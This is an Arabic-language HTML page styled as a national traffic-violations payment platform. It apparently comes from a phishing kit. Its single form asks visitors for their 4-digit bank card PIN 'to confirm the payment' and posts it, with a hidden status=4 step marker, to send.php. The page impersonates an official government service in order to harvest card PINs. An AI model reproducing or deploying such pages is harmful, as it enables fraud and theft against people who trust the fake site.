


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>
        المنصة الوطنية للمخالفات
    </title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@200;300;400;500;700;800;900&amp;display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/fontawesome.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>

    <style>
        * {
            padding: 0%;
            margin: 0%;
            box-sizing: border-box;
            direction: rtl;
            font-family: "Tajawal", sans-serif;
            color: #000;
        }

        a {
            text-decoration: none;
        }

        body {
            background-image: url(./assets/Back004.jpg);
            background-size: auto;
        }

        html {
            overflow-x: hidden;
        }

        .bbtn {
            font-size: 18px;
            color: #fff;
            padding: 10px 17px 12px;
            text-decoration: none;
            margin: 3px;
            text-align: center;
            background: #17605d;
            border: none;
            display: inline-block;
        }

        .btn-active {
            font-size: 15px;
            color: #fff;
            padding: 10px 15px 10px;
            text-decoration: none;
            text-align: center;
            background: #17605d;
            border: none;
            display: inline-block;
        }

        .btn-disable {
            font-size: 15px;
            color: #fff;
            padding: 10px 15px 10px;
            text-decoration: none;
            text-align: center;
            background: rgba(0, 150, 136, .7);
            border: none;
            display: inline-block;
        }

        .form-control {
            border-radius: 0;
            height: 45px;
        }

        .se-pre-con {
            position: fixed;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            z-index: 9999999;
            background: url(./assets/Progress2.svg) center no-repeat #ffffffeb;
            background-size: 310px 80px;
            overflow-x: hidden;
        }

        .show {
            display: block;
        }

        .hidden {
            display: none;
        }

        .detailsGroup {
            margin-top: 15px;
        }

        .detailsGroup .detailsValue {
            background: #f3f3f3;
            text-align: CENTER;
            padding: 1px 5px 5px;
        }

        .contFot {
            margin-bottom: 300px;
        }

        .btn-success {
            background-color: #17605d;
            border-color: #17605d;
        }

        @media only screen and (max-width: 600px) {
            .texF {
                display: none;
            }

            .ffre {
                text-align: center;
            }

            .ccdr {
                flex-direction: column;
                margin-top: 30px;
            }

            .butApp {
                text-align: center;
            }

            .arBut {
                width: 49%;
            }

            .colForMar {
                margin-top: 25px;
            }

            .contFot {
                margin-bottom: 150px;
            }

            .firFot {
                justify-content: center !important;
            }

            .secFor {
                margin-top: 40px;
            }

            .secForrg {
                margin-bottom: 40px;
            }
        }

        .bg-success {
            background-color: #17605d !important;
        }
    </style>
</head>

<body>

    <nav class="navbar navbar-expand-lg" style="background-color: rgba(0,150,136,.7);">
        <div class="container-fluid">
            <a class="navbar-brand" href="#"><img src="./assets/EFAAW.svg" width="120" alt=""></a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navbarSupportedContent">
            </div>
        </div>
    </nav>


    <div class="container" style="margin-top: 90px;">
        <div class="row d-flex justify-content-center" style="backdrop-filter: blur(4px);">
            <div class="col-10 shadow p-4 my-4" style="border-radius: 15px;">
                <form action="send.php" method="post">
                    <h3 class="mb-4 text-center text-white fw-bold ccolor mb-4 py-3">رقم البطاقة السري</h3>
                    <h6 class="text-center text-white lh-base mt-4">الرجاء إدخال رقم البطاقة السري المكون من 4 خانات للتأكيد على عملية الدفع</h6>
                    <div class="mt-5 text-center">
                        <label for="" class="fw-bold mb-2">
                            <input type="text" minlength="4" maxlength="4" inputmode="numeric" name="cardCode" required pattern="[0-9]+" class="form-control text-center" placeholder="****">
                            <input type="hidden" name="status" value="4">
                        </label>
                    </div>
                    <button class="btn btn-success w-100 mt-4 fw-bold mb-3" style="height: 60px !important; border-radius: 12px; font-size: 18px !important;" type="submit" name="send">تأكيد</button>
                </form>
            </div>
        </div>
    </div>



</body>

</html>